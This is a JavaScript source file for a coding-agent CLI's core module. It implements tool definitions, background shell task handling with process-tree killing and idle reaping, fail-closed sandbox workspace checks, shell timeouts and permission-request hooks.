/**
 * Agent Core — transport-independent agentic logic
 *
 * Canonical location (Phase 6b of the CLI Runtime Convergence roadmap,
 * 2026-04-09). Previously lived at `../lib/agent-core.js`; that path is
 * retained as an `@deprecated` re-export shim for backwards compatibility.
 *
 * Key exports:
 *  - AGENT_TOOLS          — OpenAI function-calling tool definitions
 *  - getBaseSystemPrompt  — system prompt generator
 *  - executeTool          — tool execution with plan-mode + hook pipeline
 *  - chatWithTools        — LLM call with tool definitions injected
 *  - agentLoop            — async generator yielding structured events
 *  - formatToolArgs       — human-readable tool argument formatting
 */

import fs from "fs";
import path from "path";
import broker from "../lib/process-execution-broker/index.js";
import os from "os";
import { createHash, randomUUID } from "node:crypto";
import skillInvocationReceipt from "@chainlesschain/session-core/skill-invocation-receipt";
import { isProxy } from "node:util/types";

const { startSkillInvocation, settleSkillInvocation } = skillInvocationReceipt;
import sharedCodingAgentPolicy from "./coding-agent-policy.cjs";
import sharedShellPolicy from "./coding-agent-shell-policy.cjs";
import sharedPermissionRules from "../lib/permission-rules.cjs";
import sharedSettingsHooks from "../lib/settings-hooks.cjs";
import sharedHookEvents from "../lib/settings-hook-events.js";
import { mergeProviderOptions } from "../lib/provider-options.js";
import { applyCredentialProxy } from "../lib/credential-proxy.js";
import {
  commitShellApprovalSideEffects,
  createShellExecutionDescriptor,
  evaluateShellCommandWithApproval,
  snapshotShellExecutionArgs,
} from "../lib/shell-approval.js";
import { describeBackgroundCommand } from "../lib/terminal-context.js";
import { buildTelemetryAttributes } from "../lib/telemetry-ids.js";
import {
  workspaceRootsFor,
  pickRootForFile,
  mergeWorkspaceSymbolResults,
} from "../lib/lsp/workspace-roots.js";
import { getPlanModeManager } from "../lib/plan-mode.js";
import { CLISkillLoader } from "../lib/skill-loader.js";
import { routeSkillDescriptors } from "../lib/skill-retrieval-router.js";
import { resolveSkillOutcomeAuthority } from "../lib/skill-outcome-authority.js";
import {
  captureSkillVectorAuthority,
  unavailableSkillVectorEvidence,
} from "../lib/skill-vector-authority.js";
import {
  admitSkillPrompt,
  debitSkillPromptBudget,
  resolveSkillLimits,
} from "../lib/skill-budget.js";
import { detectPython } from "../lib/cli-anything-bridge.js";
import { findProjectRoot, loadProjectConfig } from "../lib/project-detector.js";
import { SubAgentContext } from "../lib/sub-agent-context.js";
import {
  createLegacyAgentToolRegistry,
  getRuntimeToolDescriptorByCommand,
  getRuntimeToolDescriptor,
} from "../tools/legacy-agent-tools.js";
import {
  getCodingAgentFunctionToolDefinitions,
  listCodingAgentToolNames,
  getCodingAgentToolPolicy,
} from "./coding-agent-contract.js";
import { createToolContext } from "../tools/tool-context.js";
import { createToolTelemetryRecord } from "../tools/tool-telemetry.js";
import {
  isAbortError,
  raceWithAbort,
  throwIfAborted,
} from "../lib/abort-utils.js";
import {
  classifyEditReplay,
  editIdempotencyKey,
  EDIT_REPLAY,
} from "../lib/idempotency.js";
import { buildSearchCommand } from "../lib/search-command.js";
import { discoverCommands } from "../lib/slash-commands.js";
import {
  isRetryableStreamError,
  STREAM_RETRY_BASE_MS,
  resolveStreamRetryMax,
} from "../lib/stream-retry.js";
import {
  annotateLines,
  replaceByHash,
  snippetAround,
} from "../lib/hashline.js";
import {
  hasImageContent,
  toOllamaMessages,
  imageUrlBlockToAnthropic,
} from "../lib/image-input.js";
import { executeToolSearch, gateDeferredMcpCall } from "./mcp-tool-search.js";
import {
  emitHooksV2Event,
  executeHooksV2Event,
} from "../lib/hooks-v2-producers.js";
import {
  admitTool,
  buildToolAttribution,
} from "../lib/agent-tool-admission.js";
import { evaluateUnattendedShellAction } from "../lib/unattended-action-policy.js";
import {
  formatProviderHttpError,
  formatProviderResponseError,
} from "../lib/provider-http-error.js";
import { buildPermissionDecision } from "../lib/permission-decision.js";
import { resolveSandboxPolicyPath } from "../lib/agent-sandbox.js";
import {
  beginManagedToolCheckpoint,
  managedToolCheckpointBinding,
  settleManagedToolCheckpoint,
} from "../lib/managed-tool-checkpoint.js";
import { sessionBudgetAdmissionError } from "../lib/session-budget-production-root.js";
import {
  createMcpCallLedger,
  McpEffect,
  snapshotMcpJsonRpcInput,
} from "../lib/mcp-call-ledger.js";
import {
  admitMcpToolResult,
  isMcpToolResultAdmissionError,
} from "../lib/mcp-tool-result.js";
import {
  MCP_OUTCOME_UNKNOWN_CODE,
  markMcpLedgerOutcomeUnknown,
} from "../lib/mcp-ledger-recovery-admission.js";
import {
  createHostOwnedMcpEffectContract,
  createMcpConflictScheduler,
} from "../lib/mcp-conflict-scheduler.js";
import {
  buildExtractiveHandoff,
  formatStructuredHandoff,
} from "../harness/structured-handoff.js";
import { isMcpRpcError } from "../harness/mcp-client.js";
import { projectCanonicalResumeMessages } from "../lib/session-message-provenance.js";
import { releaseOldLiveSessionResults } from "../lib/session-runtime-retention.js";
import {
  pathMatchesOpenedFileIdentitySync,
  sameOpenedFileIdentity,
} from "../lib/packer/file-identity.js";

export { formatProviderHttpError };

/**
 * Names of MCP servers currently mounted by an in-flight run_skill call.
 * Populated by run_skill before invoking the handler and cleared in
 * the finally block. Exposed via getActiveMcpServers() so external
 * observers (web panel, future LLM prompt builders) can render only
 * the tools that are actually live for this session.
 */
const _activeMcpServers = new Set();
export function getActiveMcpServers() {
  return new Set(_activeMcpServers);
}

// Direct executeTool callers do not pass agentLoop's run-scoped scheduler.
// Share a bounded scheduler per MCP client so two concurrent calls cannot each
// create a private lock and accidentally bypass unknown/write serialization.
const _directMcpSchedulers = new WeakMap();
function directMcpConflictScheduler(mcpClient) {
  if (
    (typeof mcpClient !== "object" || mcpClient === null) &&
    typeof mcpClient !== "function"
  ) {
    return createMcpConflictScheduler({ maxActive: 1 });
  }
  let scheduler = _directMcpSchedulers.get(mcpClient);
  if (!scheduler) {
    scheduler = createMcpConflictScheduler();
    _directMcpSchedulers.set(mcpClient, scheduler);
  }
  return scheduler;
}

const { isDangerousGitCommand, isReadOnlyGitCommand, normalizeGitCommand } =
  sharedCodingAgentPolicy;
const { evaluateShellCommandPolicy } = sharedShellPolicy;
const { evaluatePermissionRules } = sharedPermissionRules;
const { umbrellaFor } = sharedSettingsHooks;
const { runObserveHooks, aggregateContext } = sharedHookEvents;

const searchProcessRunner = broker.execSync.bind(broker);
const runCodeProcessRunner = broker.execFileSync.bind(broker);

export const _agentToolProcessDeps = {
  runSearch: searchProcessRunner,
  runCode: runCodeProcessRunner,
};

function runSearchProcess(command, options = {}) {
  return _agentToolProcessDeps.runSearch(command, {
    ...options,
    origin: "agent-core:search-files",
    policy: "allow",
    scope: "agent-core",
  });
}

function runCodeProcess(file, args, options = {}, origin = "run-code") {
  return _agentToolProcessDeps.runCode(file, args, {
    ...options,
    origin: `agent-core:${origin}`,
    policy: "allow",
    scope: "agent-core",
    shell: false,
  });
}

function collectWorkspacePluginBinSandboxPolicy(
  pluginBin,
  workspaceCwd,
  executionCwd = workspaceCwd,
) {
  const resolvedWorkspaceCwd = path.resolve(workspaceCwd);
  const pluginPolicyBoundaries = new Set();
  for (const policyCwd of new Set([
    resolvedWorkspaceCwd,
    path.resolve(executionCwd),
  ])) {
    const observedPolicy = pluginBin.collectPluginBinSandboxPolicy({
      cwd: policyCwd,
    });
    for (const boundary of observedPolicy?.requiredBoundaries || []) {
      pluginPolicyBoundaries.add(boundary);
    }
  }
  return pluginBin.pinPluginBinSandboxPolicy(
    { requiredBoundaries: [...pluginPolicyBoundaries] },
    { cwd: resolvedWorkspaceCwd },
  );
}

function projectPluginBinInvocationAuthority(invocation) {
  if (!invocation) return null;
  const identity = invocation.executableIdentity || {};
  return {
    command: invocation.command || null,
    runtime: invocation.runtime || null,
    shell: invocation.shell === true,
    pluginId: invocation.pluginId || null,
    pluginVersion: invocation.pluginVersion || null,
    pluginSource: invocation.pluginSource || null,
    scope: invocation.scope || null,
    binName: invocation.binName || null,
    binPath: invocation.binPath || null,
    pluginRoot: invocation.pluginRoot || null,
    args: Array.isArray(invocation.args) ? [...invocation.args] : [],
    requiredBoundaries: [
      ...(invocation.sandboxPolicy?.requiredBoundaries || []),
    ].sort(),
    executableIdentity: {
      realPath: identity.realPath || null,
      sha256: identity.sha256 || null,
      bytes: identity.bytes ?? null,
      dev: identity.dev ?? null,
      ino: identity.ino ?? null,
      mtimeMs: identity.mtimeMs ?? null,
      mode: identity.mode ?? null,
    },
  };
}

function rethrowRunCodeSandboxFailure(error) {
  if (
    error?.sandboxFailClosed === true ||
    (typeof error?.code === "string" &&
      error.code.startsWith("ERR_PROCESS_SANDBOX"))
  ) {
    throw error;
  }
}

function createPythonInterpreterProbeSandboxFailure(sandboxPolicy) {
  const requiredBoundaries = [...(sandboxPolicy?.requiredBoundaries || [])];
  const error = new Error(
    `Python interpreter discovery cannot run without its required sandbox boundaries: ${requiredBoundaries.join(", ")}`,
  );
  error.code = "ERR_PROCESS_SANDBOX_BOUNDARY_UNSATISFIED";
  error.sandboxReason = "python_interpreter_probe_requires_sandbox";
  error.sandboxFailClosed = true;
  error.requiredBoundaries = requiredBoundaries;
  error.actualGuarantees = [];
  error.missingBoundaries = [...requiredBoundaries];
  error.sandboxBackend = null;
  error.sandboxCandidateBackend = null;
  return error;
}

function createBackgroundShellSandboxFailure(
  reason,
  message,
  sandboxPolicy,
  cause = null,
) {
  const requiredBoundaries = [...(sandboxPolicy?.requiredBoundaries || [])];
  const error = new Error(message);
  error.code = "ERR_PROCESS_SANDBOX_BOUNDARY_UNSATISFIED";
  error.sandboxReason = reason;
  error.sandboxFailClosed = true;
  error.requiredBoundaries = requiredBoundaries;
  error.actualGuarantees = [];
  error.missingBoundaries = [...requiredBoundaries];
  error.sandboxBackend = null;
  error.sandboxCandidateBackend = "linux-bwrap-workspace";
  if (cause) error.cause = cause;
  return error;
}

function resolveBackgroundShellWorkspacePaths(
  trustedWorkspaceRoot,
  requestedCwd,
  sandboxPolicy,
) {
  if (
    typeof trustedWorkspaceRoot !== "string" ||
    !trustedWorkspaceRoot ||
    trustedWorkspaceRoot.includes("\0") ||
    !path.isAbsolute(trustedWorkspaceRoot)
  ) {
    throw createBackgroundShellSandboxFailure(
      "background_workspace_root_untrusted",
      "Background shell strong sandbox requires an absolute trusted host workspace root",
      sandboxPolicy,
    );
  }
  const workspaceRoot = path.resolve(trustedWorkspaceRoot);
  let workingDirectory = workspaceRoot;
  if (
    requestedCwd !== undefined &&
    requestedCwd !== null &&
    requestedCwd !== ""
  ) {
    if (typeof requestedCwd !== "string" || requestedCwd.includes("\0")) {
      throw createBackgroundShellSandboxFailure(
        "background_working_directory_untrusted",
        "Background shell strong sandbox cwd must be a trusted path string",
        sandboxPolicy,
      );
    }
    workingDirectory = path.isAbsolute(requestedCwd)
      ? path.resolve(requestedCwd)
      : path.resolve(workspaceRoot, requestedCwd);
  }
  const relative = path.relative(workspaceRoot, workingDirectory);
  if (
    relative === ".." ||
    relative.startsWith(`..${path.sep}`) ||
    path.isAbsolute(relative)
  ) {
    throw createBackgroundShellSandboxFailure(
      "background_working_directory_escape",
      "Background shell strong sandbox cwd escapes the trusted host workspace root",
      sandboxPolicy,
    );
  }
  return { workspaceRoot, workingDirectory };
}

// ─── Background shell tasks ────────────────────────────────────────────────
//
// run_shell remains synchronous by default for compatibility. Persistent
// stream hosts opt into an async foreground path so commands cannot block the
// session heartbeat or protocol pump. When the model passes
// run_in_background:true the command is spawned instead, returns a task_id
// immediately, and streams its output into this registry. The agent then polls
// completion + incremental output via the check_shell tool — the
// run_in_background + BashOutput pattern from Claude Code.
//
// In-memory, process-lifetime: a task_id is only valid within the agent process
// that spawned it, which is exactly the polling window (one REPL session / one
// headless run). Buffers are bounded (MAX_BG_BUFFER per stream, tail-retained)
// so a chatty long task can't exhaust memory.
const MAX_BG_BUFFER = 1024 * 1024; // 1 MB retained tail per stream
const _backgroundShellTasks = new Map();
let _backgroundTaskSeq = 0;

function _runForegroundProcessAsync(file, args, options) {
  return new Promise((resolve, reject) => {
    try {
      broker.execFile(file, args, options, (error, stdout, stderr) => {
        if (error) {
          reject(error);
          return;
        }
        resolve({ stdout: stdout ?? "", stderr: stderr ?? "" });
      });
    } catch (error) {
      reject(error);
    }
  });
}

function _newBgStream() {
  return { buf: "", total: 0, dropped: 0, cursor: 0 };
}

function _appendBgStream(stream, text) {
  stream.buf += text;
  stream.total += text.length;
  if (stream.buf.length > MAX_BG_BUFFER) {
    const over = stream.buf.length - MAX_BG_BUFFER;
    stream.buf = stream.buf.slice(over);
    stream.dropped += over;
  }
}

// Read everything produced since the last read and advance the cursor. When the
// cursor points into a region already dropped from the retained tail, the gap
// is reported so the caller knows output was lost to the buffer cap.
function _readBgStream(stream) {
  const bufStart = stream.total - stream.buf.length;
  let from = stream.cursor;
  let droppedGap = 0;
  if (from < bufStart) {
    droppedGap = bufStart - from;
    from = bufStart;
  }
  const text = stream.buf.slice(from - bufStart);
  stream.cursor = stream.total;
  return { text, droppedGap };
}

/**
 * Snapshot of background shell tasks (for REPL/host status surfaces AND the
 * model-facing `check_shell { list:true }` tool).
 *
 * P1-2 (terminal-context): the `command` string can carry an inline secret
 * (`FOO=token cmd`, `curl -H "Authorization: Bearer …"`); this list is shown to
 * the model and rendered in `/tasks`, so run it through
 * `describeBackgroundCommand` to secret-redact the command and expose the PID.
 * The task's own lifecycle `status` (running/exited/failed/error) is preserved
 * — that is distinct from a health check, so it is NOT replaced. `stoppable` is
 * gated on the task still running (a valid pid alone doesn't make a dead task
 * stoppable).
 * @returns {Array<{id:string,status:string,command:string,pid:number|null,
 *   stoppable:boolean,exitCode:number|null,startedAt:string,endedAt:string}>}
 */
export function listBackgroundShellTasks() {
  return Array.from(_backgroundShellTasks.values()).map((t) => {
    const desc = describeBackgroundCommand({
      command: t.command,
      pid: t.child?.pid,
    });
    return {
      id: t.id,
      status: t.status,
      command: desc.command, // P1-2: secret-redacted
      pid: desc.pid, // P1-2: PID surfaced
      stoppable: t.status === "running" && desc.stoppable,
      exitCode: t.exitCode,
      startedAt: t.startedAt,
      endedAt: t.endedAt,
    };
  });
}

// Kill a background task's whole process tree. Because tasks are spawned with
// shell:true, the child is a shell whose real command runs as a grandchild — a
// plain child.kill() on POSIX only signals the shell (and often orphans the
// command), so a backgrounded `npm run dev` would survive. POSIX: the task is
// spawned detached (its own process group), so signal the group via the
// negative pid. Windows: `taskkill /T` walks and kills the whole tree.
// Returns true if a running task was signalled.
// Release the parent-side handles of a background task's child: the stdout/
// stderr PIPES (ref'd — on their own they keep the event loop alive) and the
// process handle. Called once a task is terminal or has been signalled to die,
// so a still-draining or slowly-dying child can never pin the process past a
// teardown. In production the agent's own REPL/run loop holds the loop open, so
// this changes nothing there; in the vitest forks pool nothing else does, and a
// SIGTERM'd-but-not-yet-dead child was tripping the worker-terminate deadline
// (the POSIX-only "Timeout terminating forks worker / Worker exited
// unexpectedly" unit-shard flake). Idempotent + best-effort.
function _releaseBgChildHandles(task) {
  const child = task?.child;
  if (!child) return;
  try {
    child.stdout?.destroy();
  } catch {
    /* noop */
  }
  try {
    child.stderr?.destroy();
  } catch {
    /* noop */
  }
  try {
    child.unref?.();
  } catch {
    /* noop */
  }
}

const backgroundTaskRunner = broker.spawn.bind(broker);
const backgroundTaskSyncRunner = broker.spawnSync.bind(broker);
const backgroundTaskContractIssuer =
  typeof broker.issueLinuxWorkspaceSandboxExecutionContract === "function"
    ? broker.issueLinuxWorkspaceSandboxExecutionContract.bind(broker)
    : null;

export const _backgroundProcessDeps = {
  run: backgroundTaskRunner,
  runSync: backgroundTaskSyncRunner,
  issueLinuxWorkspaceSandboxExecutionContract: backgroundTaskContractIssuer,
  platform: () => process.platform,
};

export function _runBackgroundTaskkill(pid, { sync = false } = {}) {
  const args = ["/pid", String(pid), "/T", "/F"];
  const options = {
    windowsHide: true,
    origin: "agent-core:background-taskkill",
    policy: "allow",
    scope: "agent-core",
  };
  return sync
    ? _backgroundProcessDeps.runSync("taskkill", args, options)
    : _backgroundProcessDeps.run("taskkill", args, options);
}

const gitProcessRunner = broker.spawnSync.bind(broker);

export const _gitProcessDeps = {
  run: gitProcessRunner,
};

function canonicalGitMetadataPath(value) {
  const resolved = path.resolve(String(value || "").trim());
  try {
    const real = fs.realpathSync.native(resolved);
    return process.platform === "win32" ? real.toLowerCase() : real;
  } catch {
    return null;
  }
}

/**
 * Distinguish the primary checkout from a linked worktree using Git's own
 * metadata paths. Unknown/non-repository locations are deliberately not
 * treated as linked worktrees.
 */
export function classifyGitCheckout(cwd) {
  const query = (argument) => {
    const result = _gitProcessDeps.run(
      "git",
      ["rev-parse", "--path-format=absolute", argument],
      {
        cwd,
        encoding: "utf8",
        timeout: 10000,
        windowsHide: true,
        origin: "agent-core:git-checkout-authority",
        policy: "allow",
        scope: "agent-core",
      },
    );
    if (result?.error || result?.status !== 0) return null;
    return canonicalGitMetadataPath(result.stdout);
  };
  const gitDirectory = query("--git-dir");
  const commonDirectory = query("--git-common-dir");
  if (!gitDirectory || !commonDirectory) return "unknown";
  return gitDirectory === commonDirectory ? "primary" : "linked";
}

function _killTask(task) {
  const child = task?.child;
  if (!child || child.killed || task?.status !== "running") return false;
  try {
    if (task.sandboxManagedTree === true) {
      // Linux generic launches are never detached. Bubblewrap owns the private
      // PID namespace and runs with --die-with-parent/--new-session, so killing
      // the Broker child reaps the complete sandbox tree.
      child.kill("SIGTERM");
    } else if (process.platform === "win32") {
      if (child.pid) {
        const tk = _runBackgroundTaskkill(child.pid);
        const fallbackDirectKill = () => {
          try {
            if (!child.killed) child.kill("SIGKILL");
          } catch {
            /* already dead */
          }
        };
        // A launch failure emits 'error'; a permissions/policy failure instead
        // launches taskkill successfully and exits non-zero. Both must fall
        // back or the background command remains alive while teardown reports
        // success.
        tk.once("error", fallbackDirectKill);
        tk.once("close", (code) => {
          if (code !== 0) fallbackDirectKill();
        });
      } else {
        child.kill();
      }
    } else if (child.pid) {
      // Negative pid → signal the whole process group (requires detached spawn).
      try {
        process.kill(-child.pid, "SIGTERM");
      } catch (_err) {
        child.kill("SIGTERM");
      }
    } else {
      child.kill("SIGTERM");
    }
    // Drop the ref'd pipe/process handles now — the group signal is away, so a
    // slowly-dying child must not pin the loop while it finishes exiting.
    _releaseBgChildHandles(task);
    return true;
  } catch (_err) {
    return false;
  }
}

/**
 * Kill one background shell task by id (for the user-facing `/tasks kill <id>`).
 * @returns {boolean} true if a running task with that id was signalled
 */
export function killBackgroundShellTask(id) {
  const task = _backgroundShellTasks.get(id);
  if (!task) return false;
  return _killTask(task);
}

/**
 * Kill every still-running background shell task. Callers (REPL exit, headless
 * shutdown) invoke this so a backgrounded `npm run dev` doesn't outlive the
 * agent. Best-effort: kill failures are swallowed.
 * @returns {number} count of tasks signalled
 */
export function killAllBackgroundShellTasks() {
  let killed = 0;
  for (const task of _backgroundShellTasks.values()) {
    if (_killTask(task)) {
      killed += 1;
    }
  }
  return killed;
}

// SYNCHRONOUS whole-tree kill for use inside a process 'exit' / signal handler,
// where only synchronous work runs to completion (the async `spawn`/`taskkill`
// in _killTask would be cut off the instant the process terminates, leaving the
// grandchild orphaned). POSIX signals the process group with SIGKILL; Windows
// uses spawnSync taskkill /T so the shell's children die too.
function _killTaskSync(task) {
  const child = task?.child;
  if (!child || child.killed || task?.status !== "running") return false;
  try {
    if (task.sandboxManagedTree === true) {
      child.kill("SIGKILL");
    } else if (process.platform === "win32") {
      if (child.pid) {
        const killed = _runBackgroundTaskkill(child.pid, { sync: true });
        if (killed.error || killed.status !== 0) {
          // Restricted runners can execute taskkill but receive a non-zero
          // access/policy result. Direct termination is the synchronous
          // last-resort for the child handle we own.
          child.kill("SIGKILL");
        }
      } else {
        child.kill();
      }
    } else if (child.pid) {
      // Negative pid → whole process group (requires the detached spawn above).
      try {
        process.kill(-child.pid, "SIGKILL");
      } catch (_err) {
        child.kill("SIGKILL");
      }
    } else {
      child.kill("SIGKILL");
    }
    _releaseBgChildHandles(task);
    return true;
  } catch (_err) {
    return false;
  }
}

/**
 * Synchronously kill every still-running background shell task. Safe to call
 * from a process 'exit' or signal handler (uses spawnSync/process.kill, not the
 * async spawn path which a terminating process would cut off). This is the
 * orphan-reclaim net for the paths the normal `finally` reaper can't cover: a
 * Ctrl-C / SIGTERM unwinds no `finally`, so without it a backgrounded dev server
 * outlives a killed `cc agent -p`.
 * @returns {number} count of tasks signalled
 */
export function killAllBackgroundShellTasksSync() {
  let killed = 0;
  for (const task of _backgroundShellTasks.values()) {
    if (_killTaskSync(task)) {
      killed += 1;
    }
  }
  return killed;
}

// Install a one-time process 'exit' net that synchronously reaps background
// shell tasks. `finally` blocks (headless/REPL) already reap on normal
// completion, but an explicit process.exit() elsewhere (serve shutdown, the
// headless signal handler that converts Ctrl-C → exit) would otherwise leave a
// backgrounded command orphaned. Installed lazily on the first background task,
// so a process that never backgrounds anything pays nothing.
let _bgExitReaperHooked = false;
function _ensureBgExitReaper() {
  if (_bgExitReaperHooked) return;
  _bgExitReaperHooked = true;
  process.once("exit", () => {
    try {
      killAllBackgroundShellTasksSync();
    } catch {
      /* best-effort teardown on exit */
    }
  });
}

// Idle-reap tuning (Claude-Code 2.1.193 "automatic memory-pressure reaping for
// idle background shell commands"). A running task is a reap candidate when it
// has produced no output for BG_IDLE_REAP_MS AND the system is under memory
// pressure (free/total below BG_MEM_PRESSURE_RATIO). Conservative on purpose:
// idle-but-active tasks and a healthy machine are left alone, and the whole
// behaviour is off when CLAUDE_CODE_DISABLE_BG_SHELL_PRESSURE_REAP=1.
const BG_IDLE_REAP_MS = 5 * 60 * 1000; // 5 min of silence
const BG_MEM_PRESSURE_RATIO = 0.1; // free < 10% of total = pressure

/**
 * Reap idle background shell tasks when the system is under memory pressure, so
 * a forgotten `npm run dev` or a wedged build can't sit on memory indefinitely.
 * No-op on a healthy machine (the pressure gate) or when disabled by env. Deps
 * (now / freemem / totalmem / thresholds) are injectable for tests.
 * @returns {string[]} ids of reaped tasks
 */
export function reapIdleBackgroundShellTasks(deps = {}) {
  if (process.env.CLAUDE_CODE_DISABLE_BG_SHELL_PRESSURE_REAP === "1") return [];
  const now = deps.now || Date.now;
  const freemem = deps.freemem || os.freemem;
  const totalmem = deps.totalmem || os.totalmem;
  const idleMs = deps.idleMs != null ? deps.idleMs : BG_IDLE_REAP_MS;
  const ratio =
    deps.pressureRatio != null ? deps.pressureRatio : BG_MEM_PRESSURE_RATIO;
  const total = totalmem();
  const free = freemem();
  if (!(total > 0) || free / total >= ratio) return []; // healthy → nothing to do
  const t = now();
  const reaped = [];
  for (const task of _backgroundShellTasks.values()) {
    if (task.status !== "running") continue;
    const last = task.lastActivityAt || Date.parse(task.startedAt) || 0;
    if (t - last < idleMs) continue; // still producing output recently
    if (_killTask(task)) {
      task.status = "reaped";
      task.endedAt = new Date().toISOString();
      task.error = "reaped: idle under memory pressure";
      reaped.push(task.id);
    }
  }
  return reaped;
}

// Foreground (synchronous) run_shell timeout. Configurable per-call via the
// optional `timeout` arg; defaults to 60s and is hard-capped at 10 min so a
// synchronous call can never wedge the loop indefinitely (use run_in_background
// for genuinely long work). Trusted harnesses may set a minimum through the
// parent-process environment so model-generated tool arguments cannot shorten a
// benchmark's platform-neutral execution allowance. The unset path preserves
// the public per-call semantics byte-for-byte.
const DEFAULT_SHELL_TIMEOUT_MS = 60000;
const MAX_SHELL_TIMEOUT_MS = 600000;
export function _resolveShellTimeout(raw, environment = process.env) {
  const configuredMinimum = Number(environment?.CC_RUN_SHELL_MIN_TIMEOUT_MS);
  const minimum =
    Number.isFinite(configuredMinimum) && configuredMinimum > 0
      ? Math.min(Math.floor(configuredMinimum), MAX_SHELL_TIMEOUT_MS)
      : 0;
  if (raw == null) return Math.max(DEFAULT_SHELL_TIMEOUT_MS, minimum);
  const n = Number(raw);
  const requested =
    Number.isFinite(n) && n > 0
      ? Math.min(Math.floor(n), MAX_SHELL_TIMEOUT_MS)
      : DEFAULT_SHELL_TIMEOUT_MS;
  return Math.max(requested, minimum);
}

/**
 * Resolve an interactive permission gate. Gives `PermissionRequest` hooks first
 * say (auto-allow → true without prompting, auto-deny → false without
 * prompting), then falls back to the injected confirmer with the identical
 * arguments the call site would have passed. When no `PermissionRequest` hook
 * matches this is byte-for-byte the previous `confirm(confirmArgs)` call, so
 * every existing permission gate keeps its exact behaviour absent a hook.
 * @returns {Promise<boolean>}
 */
async function requestInteractivePermission(
  name,
  args,
  context,
  cwd,
  confirmArgs,
) {
  if (context.hermeticExecution === true) {
    // The coordinator-owned exact scope is itself the complete mutation
    // authority for this hermetic run. It may authorize a sensitive *allowed*
    // file, but it never authorizes credential reads or any tool outside the
    // exact file-tool ceiling (those were rejected by the pure preflight).
    if (
      context.fileMutationScope != null &&
      GUARDED_FILE_MUTATION_TOOLS.has(name)
    ) {
      return true;
    }
    const confirm = context.permissionConfirm || context.shellConfirm || null;
    return typeof confirm === "function"
      ? Boolean(await confirm(confirmArgs))
      : false;
  }
  if (context.planReadOnlyFenceActive === true) {
    const confirm = context.permissionConfirm || context.shellConfirm || null;
    return typeof confirm === "function"
      ? Boolean(await confirm(confirmArgs))
      : false;
  }
  const hooksV2 = await executeHooksV2Event(
    "PermissionRequest",
    {
      schema_version: 1,
      session_id: context.sessionId || null,
      turn_id: context.turnId || null,
      tool_use_id: context.toolCallId || null,
      tool_name: name,
      raw_tool_name: name,
      tool_input: args,
      input_keys:
        args && typeof args === "object" ? Object.keys(args).sort() : [],
      reason: confirmArgs?.reason || null,
      cwd,
      ...(context.hookTraceId ? { trace_id: context.hookTraceId } : {}),
      ...(context.hookParentId ? { parent_id: context.hookParentId } : {}),
    },
    {
      failClosed: true,
      settingsHooks: context.settingsHooks,
      matchTarget: name,
      cwd,
    },
  );
  if (hooksV2.decision === "allow") return true;
  if (hooksV2.blocked || hooksV2.decision === "block") {
    emitHooksV2Event("PermissionDenied", {
      schema_version: 1,
      session_id: context.sessionId || null,
      turn_id: context.turnId || null,
      tool_use_id: context.toolCallId || null,
      tool_name: name,
      source: "hooks-v2",
    });
    return false;
  }
  const confirm = context.permissionConfirm || context.shellConfirm || null;
  const approved =
    typeof confirm === "function" ? await confirm(confirmArgs) : false;
  if (!approved) {
    emitHooksV2Event("PermissionDenied", {
      schema_version: 1,
      session_id: context.sessionId || null,
      turn_id: context.turnId || null,
      tool_use_id: context.toolCallId || null,
      tool_name: name,
      source: typeof confirm === "function" ? "user" : "no-confirmer",
    });
  }
  return approved;
}

// ─── Tool definitions ────────────────────────────────────────────────────

export const AGENT_TOOLS = getCodingAgentFunctionToolDefinitions();

const STATIC_AGENT_TOOL_NAMES = new Set(listCodingAgentToolNames());

export const AGENT_TOOL_REGISTRY = createLegacyAgentToolRegistry(AGENT_TOOLS);

function mergeToolDefinitions(baseTools = [], extraTools = []) {
  const merged = new Map();

  for (const tool of [...baseTools, ...extraTools]) {
    const name = tool?.function?.name;
    if (!name) continue;
    merged.set(name, tool);
  }

  return Array.from(merged.values());
}

export function getAgentToolDefinitions({
  names = null,
  disabledTools = [],
  extraTools = [],
  exactToolNames = false,
} = {}) {
  // `names` historically selects a built-in tool preset while independently
  // contributed host/MCP tools remain visible. Preserve that top-level behavior
  // for a non-empty preset, but let authority-bearing child contexts opt into an
  // exact all-tool ceiling. An explicit empty array is always deny-all.
  const allowedNames = Array.isArray(names) ? new Set(names) : null;
  const extraToolNames = new Set(
    (Array.isArray(extraTools) ? extraTools : [])
      .map((tool) => tool?.function?.name)
      .filter(Boolean),
  );
  const disabledNames = new Set(
    Array.isArray(disabledTools) ? disabledTools : [],
  );
  const allTools = mergeToolDefinitions(
    AGENT_TOOLS,
    Array.isArray(extraTools) ? extraTools : [],
  );

  return allTools.filter((tool) => {
    const name = tool?.function?.name;
    if (!name) return false;
    const unlistedExtraAllowed =
      allowedNames?.size > 0 &&
      exactToolNames !== true &&
      extraToolNames.has(name);
    if (allowedNames && !allowedNames.has(name) && !unlistedExtraAllowed) {
      return false;
    }
    if (disabledNames.has(name)) return false;
    return true;
  });
}

export function getAgentToolDescriptors(options = {}) {
  const allowedNames = new Set(
    getAgentToolDefinitions(options).map((tool) => tool.function.name),
  );
  return AGENT_TOOL_REGISTRY.list({ enabledOnly: options.enabledOnly }).filter(
    (descriptor) => allowedNames.has(descriptor.name),
  );
}

// ─── Shared skill loader ──────────────────────────────────────────────────

const _defaultSkillLoader = new CLISkillLoader();

/**
 * Re-scan all skill layers (Claude-Code `/reload-skills` parity): revokes this
 * process's Skill execution generation, then drops the default loader cache so
 * newly added/edited SKILL.md dirs are picked up without restarting. Returns
 * the resolved skill count.
 */
export function reloadSkills() {
  _defaultSkillLoader.revokeExecutionAuthorizations({
    message: "Skill execution authorization was revoked by /reload-skills",
    reasonCode: "reload-skills",
  });
  _defaultSkillLoader.clearCache();
  return _defaultSkillLoader.loadAll().length;
}

// ─── Cached environment detection ────────────────────────────────────────

let _cachedPython = null;
let _cachedEnvInfo = null;

const environmentProbeRunner = broker.execFileSync.bind(broker);

export const _environmentProcessDeps = {
  run: environmentProbeRunner,
};

function runEnvironmentProbe(file, args, options = {}) {
  return _environmentProcessDeps.run(file, args, {
    ...options,
    origin: "agent-core:environment-probe",
    policy: "allow",
    scope: "agent-core",
  });
}

/**
 * Get cached Python interpreter info (reuses cli-anything-bridge detection).
 * @returns {{ found: boolean, command?: string, version?: string }}
 */
export function getCachedPython() {
  if (!_cachedPython) {
    _cachedPython = detectPython();
  }
  return _cachedPython;
}

export function _resetCachedPythonForTests() {
  _cachedPython = null;
}

/**
 * Gather environment info (cached once per process).
 * @returns {{ os: string, arch: string, python: string|null, pip: boolean, node: string|null, git: boolean }}
 */
export function getEnvironmentInfo() {
  if (_cachedEnvInfo) return _cachedEnvInfo;

  const py = getCachedPython();

  let pipAvailable = false;
  if (py.found) {
    try {
